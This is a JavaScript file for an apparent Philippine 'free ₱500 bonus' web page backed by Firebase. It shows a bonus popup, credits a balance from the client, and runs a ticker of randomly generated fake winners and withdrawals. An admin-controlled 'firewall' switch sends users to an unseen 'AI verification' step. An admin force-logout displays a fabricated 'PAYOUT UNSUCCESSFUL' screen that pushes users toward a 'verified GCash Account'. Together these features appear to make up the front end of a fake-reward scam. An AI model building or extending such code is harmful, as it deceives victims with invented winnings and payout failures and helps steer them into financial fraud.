/**
 * PlayBonus.js - Complete Script
 * Features:
 * - Auto popup after 3s (fresh) / 5s (claimed)
 * - CLAIM BONUS credits +₱500 to balance
 * - CLAIM NOW shows popup
 * - Force logout sync with admin panel
 * - Real-time balance and claim state
 * - Claims tracking for index.html trend graph
 */

(function() {
    'use strict';
    
    // ========== GLOBAL VARIABLES ==========
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    var autoPopupTimer = null;
    var balanceListener = null;
    var claimListener = null;
    var forceLogoutListener = null;
    var forceLogoutFlagListener = null;
    var logoutTriggered = false;
    
    var soundCache = {
        scatter: null,
        claim: null,
        success: null
    };
    
    // ========== FORMAT NUMBER ==========
    function formatNumberWithComma(number) {
        var num = Number(number).toFixed(2);
        var parts = num.split('.');
        var wholePart = parts[0];
        var decimalPart = parts[1];
        var wholeWithCommas = wholePart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        return wholeWithCommas + '.' + decimalPart;
    }
    
    // ========== INIT SOUNDS ==========
    function initSounds() {
        try {
            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
            soundCache.claim = new Audio('sounds/claim.wav');
            soundCache.success = new Audio('sounds/success.wav');
            soundCache.scatter.volume = 0.5;
            soundCache.claim.volume = 0.7;
            soundCache.success.volume = 0.6;
        } catch(e) {}
    }
    
    function playSound(soundName) {
        if (soundCache[soundName]) {
            soundCache[soundName].currentTime = 0;
            soundCache[soundName].play().catch(function(e) {});
        }
    }
    
    // ========== INIT ==========
    function init() {
        console.log('🎁 PlayBonus Starting...');
        
        userPhone = localStorage.getItem("userPhone");
        if (!userPhone) {
            window.location.href = "index.html";
            return;
        }
        
        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) {
            phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        }
        
        initSounds();
        initFirebase();
        loadUserData();
        initTimer();
        initTicker();
        initClaimFlow();
        initConfetti();
        attachButtonEvents();
        initForceLogoutListener();
        
        console.log('✅ PlayBonus ready!');
    }
    
    // ========== INIT FIREBASE ==========
    function initFirebase() {
        if (typeof firebaseConfig === 'undefined') {
            console.error('❌ Firebase config not found!');
            return;
        }
        try {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
            console.log('✅ Firebase connected:', userPhone);
        } catch(e) { 
            console.error('Firebase error:', e); 
        }
    }
    
    // ========== LOAD USER DATA ==========
    function loadUserData() {
        if (!userRef) return;
        
        userRef.once('value', function(snapshot) {
            var data = snapshot.val();
            
            if (data) {
                currentBalance = Number(data.balance) || 0;
                isClaimed = data.claimed_ptcat === true;
                
                console.log('📊 Loaded - Balance: ₱' + currentBalance + ', Claimed:', isClaimed);
                
                updateBalanceDisplay();
                updateClaimButtonUI();
                scheduleAutoPopup();
            } else {
                console.log('🆕 New user');
                currentBalance = 0;
                isClaimed = false;
                
                userRef.set({
                    phone: userPhone,
                    balance: 0,
                    claimed_ptcat: false,
                    status: "active",
                    created_at: Date.now()
                }).then(function() {
                    updateBalanceDisplay();
                    updateClaimButtonUI();
                    scheduleAutoPopup();
                });
            }
        }).catch(function(e) {
            console.error('Load error:', e);
        });
        
        // ✅ Real-time balance listener
        if (balanceListener) {
            userRef.child('balance').off('value', balanceListener);
        }
        
        balanceListener = userRef.child('balance').on('value', function(snapshot) {
            var balance = snapshot.val();
            if (balance !== null && balance !== undefined) {
                currentBalance = Number(balance);
                console.log('💰 Balance updated: ₱' + currentBalance);
                updateBalanceDisplay();
            }
        });
        
        // ✅ Real-time claim listener
        if (claimListener) {
            userRef.child('claimed_ptcat').off('value', claimListener);
        }
        
        claimListener = userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var claimed = snapshot.val();
            var newState = (claimed === true);
            
            if (newState !== isClaimed) {
                isClaimed = newState;
                console.log('🔄 Claim state changed:', isClaimed);
                updateClaimButtonUI();
            }
        });
    }
    
    // ========== AUTO POPUP ==========
    function scheduleAutoPopup() {
        if (autoPopupTimer) clearTimeout(autoPopupTimer);
        
        var delay = isClaimed ? 5000 : 3000;
        console.log('⏰ Auto popup in ' + (delay / 1000) + 's (isClaimed:', isClaimed + ')');
        
        autoPopupTimer = setTimeout(function() {
            autoShowBonusPopup();
        }, delay);
    }
    
    function autoShowBonusPopup() {
        console.log('🎁 Auto-showing bonus popup (isClaimed:', isClaimed + ')');
        
        var popup = document.getElementById('bonusRewardPopup');
        if (!popup) {
            console.error('❌ Popup not found: bonusRewardPopup');
            return;
        }
        
        popup.style.display = 'flex';
        playSound('scatter');
        updateClaimButtonUI();
    }
    
    // ========== UPDATE BALANCE DISPLAY ==========
    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.innerText = formatNumberWithComma(currentBalance);
            console.log('💵 Display: ₱' + formatNumberWithComma(currentBalance));
        }
    }
    
    // ========== ANIMATED BALANCE ==========
    function animateBalanceThenSave(oldBalance, newBalance, callback) {
        var startTime = null;
        var duration = 1500;
        
        function step(timestamp) {
            if (!startTime) startTime = timestamp;
            var progress = Math.min((timestamp - startTime) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (newBalance - oldBalance) + oldBalance);
            
            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) {
                balanceEl.innerText = formatNumberWithComma(val);
            }
            
            if (progress < 1) {
                requestAnimationFrame(step);
            } else {
                if (callback) callback();
            }
        }
        
        requestAnimationFrame(step);
    }
    
    // ========== CHECK FIREWALL ==========
    function checkFirewallBeforeClaim() {
        try {
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                return (data && data.active === true);
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }
    
    // ========== TRACK CLAIM IN FIREBASE (FOR INDEX TREND GRAPH) ==========
    function trackClaimInFirebase(amount) {
        try {
            var now = new Date();
            var year = now.getFullYear();
            var month = String(now.getMonth() + 1).padStart(2, '0');
            var day = String(now.getDate()).padStart(2, '0');
            var hour = now.getHours();
            var dateKey = year + '-' + month + '-' + day;
            
            var dayRef = db.ref('festival_stats/daily/' + dateKey);
            
            // ✅ Atomic transaction
            dayRef.transaction(function(data) {
                if (data === null) {
                    data = { 
                        claims_count: 0, 
                        claims_amount: 0,
                        hourly_claims: {}
                    };
                }
                
                // ✅ Increment claims
                data.claims_count = (data.claims_count || 0) + 1;
                data.claims_amount = (data.claims_amount || 0) + (amount || 0);
                
                // ✅ Track hourly (for line graph)
                if (!data.hourly_claims) data.hourly_claims = {};
                data.hourly_claims[hour] = (data.hourly_claims[hour] || 0) + 1;
                
                data.last_update = Date.now();
                return data;
            });
            
            console.log('📊 CLAIM TRACKED:', dateKey, 'Hour:', hour, '₱' + amount);
            
        } catch(e) {
            console.error('❌ Track claim error:', e);
        }
    }
    
    // ========== INIT CLAIM FLOW ==========
    function initClaimFlow() {
        console.log('🎁 Init Claim Flow...');
        
        var claimNowBtn = document.getElementById('claimNowBtn');
        var popup = document.getElementById('bonusRewardPopup');
        
        // ========== CLAIM NOW BUTTON (Main Page) ==========
        if (claimNowBtn) {
            claimNowBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                
                console.log('🖱️ CLAIM NOW clicked (isClaimed:', isClaimed + ')');
                
                playSound('scatter');
                
                if (popup) {
                    popup.style.display = 'flex';
                    updateClaimButtonUI();
                }
            });
        }
        
        // ========== CLAIM BONUS BUTTON (Inside Popup) ==========
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.addEventListener('click', handleClaimBonus);
        }
        
        // ========== POPUP CLOSE BUTTON ==========
        var closeBtn = document.getElementById('bonusRewardClose');
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }
        
        // ========== POPUP BACK BUTTON ==========
        var backBtn = document.getElementById('bonusRewardBack');
        if (backBtn) {
            backBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }
        
        updateClaimButtonUI();
        console.log('✅ Claim Flow ready');
    }
    
    // ========== HANDLE CLAIM BONUS ==========
    function handleClaimBonus(e) {
        e.preventDefault();
        e.stopPropagation();
        
        console.log('🖱️ CLAIM BONUS clicked (isClaimed:', isClaimed + ')');
        
        if (isClaimed) {
            alert("You have already claimed this bonus!");
            return;
        }
        
        if (claimInProgress) {
            alert("Please wait, processing...");
            return;
        }
        
        if (!userRef) {
            alert("System not ready. Please refresh.");
            return;
        }
        
        // Double-check from Firebase
        userRef.child('claimed_ptcat').once('value', function(snapshot) {
            if (snapshot.val() === true) {
                isClaimed = true;
                updateClaimButtonUI();
                alert("You have already claimed this bonus!");
                return;
            }
            processClaim();
        }).catch(function(error) {
            console.error('Check error:', error);
            processClaim();
        });
    }
    
    // ========== PROCESS CLAIM ==========
    function processClaim() {
        claimInProgress = true;
        
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.6';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
        }
        
        // Check firewall
        checkFirewallBeforeClaim().then(function(firewallOn) {
            if (firewallOn) {
                console.log('🔥 Firewall ON - Show carnival AI verification');
                
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';
                
                // ✅ Credit first, then show arcade
                creditBonusAndMark(function() {
                    if (window.showPopup) {
                        window.showPopup(currentBalance);
                    }
                    claimInProgress = false;
                });
            } else {
                console.log('🔓 Firewall OFF - Direct claim');
                
                creditBonusAndMark(function() {
                    var popup = document.getElementById('bonusRewardPopup');
                    if (popup) popup.style.display = 'none';
                    
                    setTimeout(function() {
                        showSuccessPopup(bonusAmount);
                    }, 300);
                    
                    claimInProgress = false;
                });
            }
        }).catch(function(error) {
            console.error('Firewall error:', error);
            claimInProgress = false;
            resetClaimButton();
        });
    }
    
    // ========== CREDIT BONUS + MARK CLAIMED (ATOMIC) ==========
    function creditBonusAndMark(callback) {
        console.log('💰 Crediting ₱' + bonusAmount + ' to balance...');
        
        var oldBalance = currentBalance;
        var newBalance = oldBalance + bonusAmount;
        
        console.log('   Old: ₱' + oldBalance);
        console.log('   New: ₱' + newBalance);
        
        // ✅ ATOMIC UPDATE
        userRef.update({
            balance: newBalance,
            claimed_ptcat: true,
            ptcat_claimed_at: Date.now(),
            lastUpdate: Date.now()
        }).then(function() {
            console.log('✅ Firebase updated! New balance: ₱' + newBalance);
            
            currentBalance = newBalance;
            isClaimed = true;
            
            // Animate balance
            animateBalanceThenSave(oldBalance, newBalance, function() {
                updateBalanceDisplay();
            });
            
            // ✅ TRACK CLAIM in festival_stats for index.html
            trackClaimInFirebase(bonusAmount);
            
            // Play sound
            playSound('claim');
            
            // Confetti
            startConfetti();
            
            // Update UI
            updateClaimButtonUI();
            
            if (callback) callback();
            
        }).catch(function(error) {
            console.error('❌ Firebase update error:', error);
            alert('Error saving claim. Please try again.');
            claimInProgress = false;
            resetClaimButton();
        });
    }
    
    // ========== RESET CLAIM BUTTON ==========
    function resetClaimButton() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
        }
        claimInProgress = false;
    }
    
    // ========== UPDATE CLAIM BUTTON UI ==========
    function updateClaimButtonUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        var bonusLabel = document.querySelector('.bonus-label');
        
        if (!ptCatClaimBtn) return;
        
        if (isClaimed) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.5';
            ptCatClaimBtn.style.cursor = 'not-allowed';
            ptCatClaimBtn.style.pointerEvents = 'none';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
            ptCatClaimBtn.classList.add('claimed');
            
            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS CLAIMED';
                bonusLabel.style.color = '#39ff14';
            }
            
            console.log('🔒 UI: ALREADY CLAIMED');
        } else {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.style.cursor = 'pointer';
            ptCatClaimBtn.style.pointerEvents = 'auto';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
            ptCatClaimBtn.classList.remove('claimed');
            
            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS REWARD';
                bonusLabel.style.color = '';
            }
            
            console.log('🔓 UI: CLAIM BONUS available');
        }
    }
    
    // ========== SUCCESS POPUP ==========
    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');
        
        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';
        
        playSound('success');
        
        if (closeBtn) {
            closeBtn.onclick = function() {
                popup.style.display = 'none';
            };
        }
        
        setTimeout(function() {
            if (popup) popup.style.display = 'none';
        }, 5000);
    }
    
    // ========== TIMER ==========
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;
        
        var CYCLE_HOURS = 72;
        var timerEndDate = null;
        
        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();
            
            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }
            
            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;
                
                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }
                
                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);
                
                displayElement.innerHTML = days + 'D ' +
                    hours.toString().padStart(2, '0') + ':' +
                    minutes.toString().padStart(2, '0') + ':' +
                    seconds.toString().padStart(2, '0');
            }
            
            update();
            setInterval(update, 1000);
        } catch(e) {
            console.error('Timer error:', e);
        }
    }
    
    // ========== TICKER ==========
    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;
        
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        
        var amountRarity = [
            { amount: 500, weight: 85 },
            { amount: 1000, weight: 10 },
            { amount: 2000, weight: 3 },
            { amount: 2500, weight: 2 }
        ];
        
        var actions = ["received", "received", "withdraw"];
        
        function generateRandomAmount() {
            var totalWeight = 0;
            for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
            var random = Math.random() * totalWeight;
            var cumulative = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                cumulative += amountRarity[i].weight;
                if (random <= cumulative) return amountRarity[i].amount;
            }
            return 500;
        }
        
        function updateTicker() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = generateRandomAmount();
            var action = actions[Math.floor(Math.random() * actions.length)];
            
            winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action + 
                ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + 
                amount.toLocaleString();
        }
        
        updateTicker();
        setInterval(updateTicker, 4800);
    }
    
    // ========== CONFETTI ==========
    var confettiCanvas = null;
    var confettiAnimation = null;
    
    function initConfetti() {
        confettiCanvas = document.getElementById('confettiCanvas');
    }
    
    function startConfetti() {
        if (!confettiCanvas) return;
        
        confettiCanvas.style.display = 'block';
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;
        
        var ctx = confettiCanvas.getContext('2d');
        var particles = [];
        
        for (var i = 0; i < 150; i++) {
            particles.push({
                x: Math.random() * confettiCanvas.width,
                y: Math.random() * confettiCanvas.height - confettiCanvas.height,
                size: Math.random() * 8 + 3,
                color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
                speed: Math.random() * 4 + 2,
                rotation: Math.random() * 360,
                rotationSpeed: (Math.random() - 0.5) * 10
            });
        }
        
        function draw() {
            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            
            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                ctx.save();
                ctx.translate(p.x, p.y);
                ctx.rotate(p.rotation * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                ctx.restore();
                
                p.y += p.speed;
                p.rotation += p.rotationSpeed;
                
                if (p.y > confettiCanvas.height) {
                    p.y = -p.size;
                    p.x = Math.random() * confettiCanvas.width;
                }
            }
            confettiAnimation = requestAnimationFrame(draw);
        }
        
        draw();
        
        setTimeout(function() {
            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            confettiCanvas.style.display = 'none';
        }, 4000);
    }
    
    // ========== ATTACH BUTTON EVENTS ==========
    function attachButtonEvents() {
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', function() {
                logoutUser();
            });
        }
        
        var fbBtn = document.getElementById('facebookShareBtn');
        if (fbBtn) {
            fbBtn.addEventListener('click', function() {
                shareOnFacebook();
            });
        }
    }
    
    // ========== LOGOUT ==========
    function logoutUser() {
        if (userPhone) {
            try {
                db.ref('user_sessions/' + userPhone).update({
                    status: 'offline',
                    lastSeen: firebase.database.ServerValue.TIMESTAMP
                });
            } catch(e) {}
        }
        localStorage.clear();
        sessionStorage.clear();
        window.location.replace('index.html');
    }
    
    // ========== FACEBOOK SHARE ==========
    function shareOnFacebook() {
        var shareUrl = 'https://tiny.cc/LuckyDrop';
        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
    }
    
    // ========== BAN CHECK ==========
    function checkIfBanned() {
        if (!userPhone) return;
        try {
            db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
                if (snap.exists()) {
                    db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.replace('index.html');
                }
            });
        } catch(e) {}
    }
    
    // ============================================================
    // FORCE LOGOUT LISTENER (SYNC WITH ADMIN)
    // ============================================================
    
    function initForceLogoutListener() {
        if (!userPhone || !db) {
            console.log('⚠️ Cannot init force logout - missing userPhone or db');
            return;
        }
        
        var cleanPhone = userPhone.replace(/[^0-9]/g, '');
        console.log('🔍 Force Logout Listener active for:', cleanPhone);
        
        try {
            // Listen to user status changes
            forceLogoutListener = db.ref('user_sessions/' + cleanPhone + '/status');
            
            forceLogoutListener.on('value', function(snapshot) {
                var status = snapshot.val();
                console.log('📡 Status update:', status);
                
                if (status === 'offline' && !logoutTriggered) {
                    console.log('⚠️ FORCE LOGOUT TRIGGERED!');
                    logoutTriggered = true;
                    
                    if (forceLogoutListener) {
                        forceLogoutListener.off();
                        forceLogoutListener = null;
                    }
                    
                    showForceLogoutPopup();
                }
            });
            
            // Also listen to forceLogout flag
            forceLogoutFlagListener = db.ref('user_sessions/' + cleanPhone + '/forceLogout');
            forceLogoutFlagListener.on('value', function(snapshot) {
                var forceFlag = snapshot.val();
                if (forceFlag === true && !logoutTriggered) {
                    console.log('⚠️ FORCE LOGOUT FLAG DETECTED!');
                    logoutTriggered = true;
                    
                    if (forceLogoutFlagListener) {
                        forceLogoutFlagListener.off();
                        forceLogoutFlagListener = null;
                    }
                    
                    showForceLogoutPopup();
                }
            });
            
        } catch(e) {
            console.error('Force logout listener error:', e);
        }
    }
    
    // ========== SHOW FORCE LOGOUT POPUP ==========
    function showForceLogoutPopup() {
        if (document.querySelector('.force-logout-popup')) return;
        
        addForceLogoutAnimations();
        
        var overlay = document.createElement('div');
        overlay.className = 'force-logout-popup';
        overlay.style.cssText = 
            'position: fixed;' +
            'inset: 0;' +
            'background: radial-gradient(ellipse at center, rgba(20, 0, 0, 0.98), rgba(0, 0, 0, 0.99));' +
            'backdrop-filter: blur(15px);' +
            '-webkit-backdrop-filter: blur(15px);' +
            'z-index: 999999;' +
            'display: flex;' +
            'align-items: center;' +
            'justify-content: center;' +
            'animation: fadeInForceLogout 0.4s ease;' +
            'padding: 20px;';
        
        var particles = document.createElement('div');
        particles.style.cssText = 
            'position: absolute;' +
            'inset: 0;' +
            'overflow: hidden;' +
            'pointer-events: none;';
        
        for (var i = 0; i < 30; i++) {
            var particle = document.createElement('div');
            var size = Math.random() * 4 + 2;
            var startX = Math.random() * 100;
            var delay = Math.random() * 3;
            var duration = Math.random() * 3 + 2;
            particle.style.cssText = 
                'position: absolute;' +
                'top: -10px;' +
                'left: ' + startX + '%;' +
                'width: ' + size + 'px;' +
                'height: ' + size + 'px;' +
                'background: rgba(255, 215, 0, ' + (Math.random() * 0.5 + 0.3) + ');' +
                'border-radius: 50%;' +
                'animation: floatDownForceLogout ' + duration + 's ' + delay + 's linear infinite;' +
                'box-shadow: 0 0 ' + (size * 2) + 'px rgba(255, 215, 0, 0.6);';
            particles.appendChild(particle);
        }
        overlay.appendChild(particles);
        
        var cardWrapper = document.createElement('div');
        cardWrapper.style.cssText = 
            'position: relative;' +
            'z-index: 1;' +
            'animation: cardEnterForceLogout 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);' +
            'max-width: 360px;' +
            'width: 100%;';
        
        var glowRing = document.createElement('div');
        glowRing.style.cssText = 
            'position: absolute;' +
            'inset: -3px;' +
            'border-radius: 28px;' +
            'background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.8), transparent, rgba(255, 215, 0, 0.4), transparent);' +
            'animation: rotateGlowForceLogout 4s linear infinite;' +
            'filter: blur(3px);';
        cardWrapper.appendChild(glowRing);
        
        var card = document.createElement('div');
        card.style.cssText = 
            'position: relative;' +
            'background: linear-gradient(160deg, #1a0000 0%, #2a0000 40%, #0d0000 100%);' +
            'border: 3px solid rgba(255, 215, 0, 0.6);' +
            'border-radius: 24px;' +
            'padding: 35px 28px 28px;' +
            'text-align: center;' +
            'box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 60px rgba(255, 215, 0, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.05);' +
            'overflow: hidden;';
        
        var accentLine = document.createElement('div');
        accentLine.style.cssText = 
            'position: absolute;' +
            'top: 0;' +
            'left: 20%;' +
            'right: 20%;' +
            'height: 3px;' +
            'background: linear-gradient(90deg, transparent, #ffd700, #fff9c4, #ffd700, transparent);' +
            'border-radius: 0 0 3px 3px;' +
            'box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);';
        card.appendChild(accentLine);
        
        var iconContainer = document.createElement('div');
        iconContainer.style.cssText = 
            'position: relative;' +
            'width: 90px;' +
            'height: 90px;' +
            'margin: 0 auto 16px;';
        
        var iconRing = document.createElement('div');
        iconRing.style.cssText = 
            'position: absolute;' +
            'inset: -8px;' +
            'border-radius: 50%;' +
            'border: 2px dashed rgba(255, 215, 0, 0.5);' +
            'animation: spinSlowForceLogout 10s linear infinite;';
        iconContainer.appendChild(iconRing);
        
        var iconBg = document.createElement('div');
        iconBg.style.cssText = 
            'width: 90px;' +
            'height: 90px;' +
            'background: radial-gradient(circle, rgba(255, 68, 68, 0.9), rgba(139, 0, 0, 0.95));' +
            'border-radius: 50%;' +
            'display: flex;' +
            'align-items: center;' +
            'justify-content: center;' +
            'border: 3px solid #ffd700;' +
            'box-shadow: 0 0 30px rgba(255, 215, 0, 0.6), inset 0 0 20px rgba(0, 0, 0, 0.5);';
        
        var iconEl = document.createElement('span');
        iconEl.style.cssText = 
            'font-size: 44px;' +
            'animation: bounceIconForceLogout 0.8s ease;' +
            'filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.8));';
        iconEl.textContent = '💸';
        iconBg.appendChild(iconEl);
        iconContainer.appendChild(iconBg);
        card.appendChild(iconContainer);
        
        var badge = document.createElement('div');
        badge.style.cssText = 
            'display: inline-block;' +
            'background: rgba(255, 68, 68, 0.2);' +
            'border: 1px solid rgba(255, 68, 68, 0.5);' +
            'border-radius: 20px;' +
            'padding: 5px 16px;' +
            'margin-bottom: 12px;' +
            'font-family: "Orbitron", monospace;' +
            'font-size: 9px;' +
            'font-weight: 700;' +
            'color: #ff6666;' +
            'letter-spacing: 2px;' +
            'text-transform: uppercase;' +
            'animation: pulseBadgeForceLogout 2s infinite;';
        badge.textContent = '● Session Ended';
        card.appendChild(badge);
        
        var titleEl = document.createElement('h2');
        titleEl.style.cssText = 
            'font-family: "Playfair Display", serif;' +
            'font-size: 24px;' +
            'font-weight: 900;' +
            'background: linear-gradient(to bottom, #fff9c4 0%, #ffd700 50%, #ff9800 100%);' +
            '-webkit-background-clip: text;' +
            'background-clip: text;' +
            'color: transparent;' +
            'margin: 0 0 10px 0;' +
            'letter-spacing: 2px;' +
            'text-transform: uppercase;' +
            'filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.6));';
        titleEl.textContent = 'PAYOUT UNSUCCESSFUL';
        card.appendChild(titleEl);
        
        var dividerContainer = document.createElement('div');
        dividerContainer.style.cssText = 
            'display: flex;' +
            'align-items: center;' +
            'justify-content: center;' +
            'gap: 10px;' +
            'margin: 0 auto 18px;';
        
        var lineLeft = document.createElement('div');
        lineLeft.style.cssText = 'width: 50px; height: 1px; background: linear-gradient(90deg, transparent, #ffd700);';
        
        var diamond = document.createElement('div');
        diamond.style.cssText = 'width: 8px; height: 8px; background: #ffd700; transform: rotate(45deg); box-shadow: 0 0 10px rgba(255, 215, 0, 0.8);';
        
        var lineRight = document.createElement('div');
        lineRight.style.cssText = 'width: 50px; height: 1px; background: linear-gradient(90deg, #ffd700, transparent);';
        
        dividerContainer.appendChild(lineLeft);
        dividerContainer.appendChild(diamond);
        dividerContainer.appendChild(lineRight);
        card.appendChild(dividerContainer);
        
        var msgEl = document.createElement('div');
        msgEl.style.cssText = 
            'font-family: "Poppins", sans-serif;' +
            'font-size: 14px;' +
            'color: #ccc;' +
            'line-height: 1.7;' +
            'margin: 0 0 12px 0;';
        msgEl.innerHTML = 
            'Your payout request is <span style="color: #ff6666; font-weight: 700;">unsuccessful</span>.<br><br>' +
            'Use <strong style="color: #fff9c4;">verified GCash Account</strong><br>' +
            'to process instant withdrawal.';
        card.appendChild(msgEl);
        
        var infoBox = document.createElement('div');
        infoBox.style.cssText = 
            'background: rgba(255, 215, 0, 0.08);' +
            'border: 1px solid rgba(255, 215, 0, 0.3);' +
            'border-radius: 12px;' +
            'padding: 12px 14px;' +
            'margin: 14px 0 20px;' +
            'font-family: "Poppins", sans-serif;' +
            'font-size: 11px;' +
            'color: #999;' +
            'text-align: left;' +
            'line-height: 1.5;';
        infoBox.innerHTML = 
            '<div style="display: flex; align-items: center; gap: 8px; margin-bottom: 6px;">' +
                '<span style="font-size: 18px;">💡</span>' +
                '<span style="color: #ffd700; font-weight: 700;">Tip for successful withdrawal:</span>' +
            '</div>' +
            '<span>Make sure your GCash account is <strong style="color: #39ff14;">fully verified</strong> with the same mobile number.</span>';
        card.appendChild(infoBox);
        
        var btn = document.createElement('button');
        btn.style.cssText = 
            'width: 100%;' +
            'background: linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);' +
            'border: 3px solid #fff9c4;' +
            'border-radius: 14px;' +
            'padding: 16px 24px;' +
            'font-family: "Orbitron", monospace;' +
            'font-size: 14px;' +
            'font-weight: 900;' +
            'color: #8b0000;' +
            'cursor: pointer;' +
            'letter-spacing: 2px;' +
            'text-shadow: 0 2px 0 rgba(255, 255, 255, 0.6);' +
            'box-shadow: 0 5px 0 #8b4500, 0 10px 25px rgba(0, 0, 0, 0.6), 0 0 35px rgba(255, 215, 0, 0.7);' +
            'transition: all 0.1s ease;' +
            'text-transform: uppercase;' +
            'position: relative;' +
            'overflow: hidden;';
        
        var btnShimmer = document.createElement('div');
        btnShimmer.style.cssText = 
            'position: absolute;' +
            'top: 0;' +
            'left: -100%;' +
            'width: 100%;' +
            'height: 100%;' +
            'background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent);' +
            'animation: btnShineForceLogout 2.5s infinite;';
        btn.appendChild(btnShimmer);
        
        var btnText = document.createElement('span');
        btnText.style.cssText = 'position: relative; z-index: 1;';
        btnText.textContent = '🏠 RETURN TO HOME';
        btn.appendChild(btnText);
        
        btn.addEventListener('click', function() {
            overlay.style.animation = 'fadeOutForceLogout 0.3s ease forwards';
            cardWrapper.style.animation = 'cardExitForceLogout 0.3s ease forwards';
            setTimeout(function() {
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace('index.html');
            }, 300);
        });
        
        card.appendChild(btn);
        cardWrapper.appendChild(card);
        overlay.appendChild(cardWrapper);
        document.body.appendChild(overlay);
        
        setTimeout(function() {
            if (document.querySelector('.force-logout-popup')) {
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace('index.html');
            }
        }, 10000);
    }
    
